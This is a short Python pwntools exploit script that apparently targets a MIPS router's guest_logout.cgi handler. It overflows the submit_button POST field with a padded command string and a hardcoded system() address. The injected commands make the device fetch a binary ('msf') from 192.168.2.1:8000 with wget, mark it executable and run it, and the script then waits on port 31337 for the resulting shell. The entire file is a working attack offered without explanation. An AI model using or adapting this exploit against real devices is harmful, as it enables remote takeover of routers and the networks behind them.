from pwn import *
import thread,requests
context(arch='mips',endian='little',os='linux')

io      = listen(31337)
system  = 0x0047A610

cmd     = '\n'
cmd    += 'rm /msf\n'
cmd    += 'wget http://192.168.2.1:8000/tools/msf -O /msf\n'
cmd    += 'chmod 777 /msf\n'
cmd    += '/msf\n'

assert(len(cmd) < 0x55)

payload =  "status_guestnet.asp" + cmd.ljust(0x55,'a') + p32(system) 
data    = {"cmac":"12:af:aa:bb:cc:dd", "submit_button":payload, "cip":"192.168.100.1"}

def attack():
    try: requests.post("http://192.168.2.2/guest_logout.cgi", data=data,timeout=1)
    except: pass

thread.start_new_thread(attack,())
io.wait_for_connection()
log.success("getshell")
io.interactive()